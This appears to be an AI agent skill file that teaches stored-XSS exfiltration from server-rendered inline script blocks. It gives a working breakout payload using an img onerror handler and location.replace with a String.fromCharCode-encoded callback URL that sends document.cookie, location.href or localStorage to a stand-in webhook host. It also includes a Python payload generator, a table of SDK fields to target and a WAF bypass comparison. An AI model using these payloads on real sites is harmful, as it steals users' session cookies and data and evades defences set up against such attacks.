---
name: inline-script-breakout-exfil
description: "Exfiltrate data from stored XSS inside inline script blocks when constrained by unquoted HTML attribute context, WAF, and CSP. Use when XSS payload lands inside server-rendered inline script and standard exfil (fetch, eval, atob) is blocked."
---

# Inline Script Breakout Exfiltration

## The Constraint Problem

After `</script>` closes an inline script tag, the browser's HTML parser takes over. If the payload lands in a JSON string value:

```html
<script>window.config = {"user":{"name":"</script><img src=x onerror=HANDLER>","role":"admin"}};</script>
```

The `onerror=HANDLER` is an **unquoted HTML attribute**. These characters terminate unquoted attribute values: `=`, `"`, `'`, space, `<`, `>`, backtick.

### What's eliminated

`eval('code')`, `atob("base64")`, `fetch('/path')`, `new XMLHttpRequest()`, `var x = 1`, `x = document.cookie` -- all contain forbidden characters.

### What still works

`alert(document.domain)`, `location.replace(URL)`, `String.fromCharCode(N,N,N)`, nested calls like `X(Y(Z))`, concatenation with `+`.

## The Exfiltration Technique

### Pattern: `location.replace(String.fromCharCode(...)+document.cookie)`

```
</script><img src=x onerror=location.replace(String.fromCharCode(CHARCODE_URL)+document.cookie)>
```

**Why this works:**
1. `location.replace()` -- navigates the page (method call, no `=`)
2. `String.fromCharCode(104,116,116,112,...)` -- builds URL without quotes
3. `+document.cookie` -- concatenates readable cookies
4. Navigation is NOT governed by CSP `connect-src`
5. No WAF trigger patterns present

### Building the payload

```python
callback = "https://YOUR-WEBHOOK.example.com/callback?c="
char_codes = ",".join(str(ord(c)) for c in callback)

payload = f"</script><img src=x onerror=location.replace(String.fromCharCode({char_codes})+document.cookie)>"

# Verify no forbidden chars in onerror value
onerror = payload.split("onerror=")[1].rstrip(">")
forbidden = [c for c in onerror if c in ' "\'=<>`']
assert not forbidden, f"Forbidden chars: {forbidden}"
```

### Payload variants

**Exfil URL/path:** `onerror=location.replace(String.fromCharCode(...)+location.href)`

**Exfil localStorage:** `onerror=location.replace(String.fromCharCode(...)+localStorage.getItem(String.fromCharCode(107,101,121)))`

## Identifying Injection Targets

Server-rendered HTML containing user-controlled data inside `<script>` blocks:

| SDK/Pattern | Injection field |
|-------------|-----------------|
| LaunchDarkly | `user.name`, `user.email` in context |
| Segment/Analytics | User traits in `analytics.identify()` |
| Next.js SSR | Page props in `__NEXT_DATA__` |
| Nuxt.js SSR | State in `window.__NUXT__` |
| Django templates | `{{ variable\|safe }}` |
| Statsig/PostHog | User attributes in init |

### Verification steps

1. Set canary value in suspected field (e.g., `XSSCANARY123`)
2. Fetch page and search for canary in inline scripts
3. Check if `</script>` is escaped (`\u003c/script>` or `&lt;/script&gt;`)
4. If NOT escaped, inject `</script><img src=x onerror=alert(document.domain)>`
5. If alert fires, use `String.fromCharCode` exfil technique

## WAF Bypass Summary

| Payload pattern | Verdict | Why |
|-----------------|---------|-----|
| `<script>fetch(...)</script>` | BLOCKED | `<script>` tag |
| `<img onerror=eval(atob("..."))>` | BLOCKED | `eval(atob(` |
| `<img onerror=location.replace(String.fromCharCode(...)+document.cookie)>` | PASSED | No trigger patterns |

## Limitations

- `HttpOnly` cookies are NOT in `document.cookie` -- but same-origin fetch sends them automatically
- The redirect is visible to the victim (not stealthy)
- Very long URLs may be truncated by the browser

## Related Skills

- **self-xss-escalation** -- When XSS only fires in your own session
- **csp-bypass** -- When CSP blocks inline scripts entirely
- **dom-vulnerability-detection** -- Finding client-side sinks
